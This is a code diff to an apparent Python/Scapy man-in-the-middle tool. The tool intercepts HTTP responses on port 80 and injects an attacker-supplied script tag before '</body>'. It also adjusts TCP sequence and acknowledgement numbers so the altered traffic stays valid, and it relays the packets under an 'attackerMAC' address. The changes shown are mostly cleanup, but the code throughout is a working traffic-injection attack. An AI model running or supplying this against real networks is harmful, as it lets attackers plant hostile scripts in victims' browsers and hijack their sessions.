@@ -81,7 +81,6 @@ def faketcp(packet):
             debug(f'Initialize {packet[TCP].sport}->{packet[TCP].dport}')
             tcpStates[state] = {'nb_more': 0, 'fin': 0}
 
-
         if packet.haslayer(Raw):
             oldlen = len(packet[Raw].load)
             load = packet[Raw].load.decode('utf-8')
@@ -97,33 +96,25 @@ def faketcp(packet):
             target = re.compile(re.escape('</body>'), re.IGNORECASE)
             script = f'<script>{args.script}</script></body>'
             load = target.sub(script, load)
-            if script in load:
-                l1, l2 = load.split(script)
-                l2 = script+l2
-            else:
-                ps = [packet]
-
-
-
             packet[Raw].load = load.encode('utf-8')
 
             len_more = len(packet[Raw].load) - oldlen
             debug(f'Len more: {len_more}')
 
-        if packet[TCP].seq != 1 and packet[TCP].sport == 80:
+        if packet[TCP].seq!=1 and packet[TCP].sport==80:
             packet.seq += tcpStates[state]['nb_more']
-        if packet[TCP].flags.A and packet[TCP].dport == 80:
+        if packet[TCP].flags.A and packet[TCP].dport==80:
             packet.ack -= tcpStates[state]['nb_more']
 
         if packet.haslayer(Raw):
             tcpStates[state]['nb_more'] += len_more
 
-        if tcpStates[state]['fin'] == 2:
+        if tcpStates[state]['fin']==2:
             del tcpStates[state]
         else:
             flag = packet[TCP].flags
-            if flag.F:
-                tcpStates[state]['fin'] += 1
+            if flag.F: tcpStates[state]['fin']+=1
+
 
         return [packet]
     except Exception as e:
@@ -142,8 +133,7 @@ def handle_packet(p):
         if p[Ether].src != attackerMAC and p.haslayer(TCP):
             debug(f'Sniffed: {p.summary()}')
             ps = faketcp(p)
-            if p == None:
-                return
+            if p == None: return
 
         for p in ps:
             p[Ether].src = attackerMAC
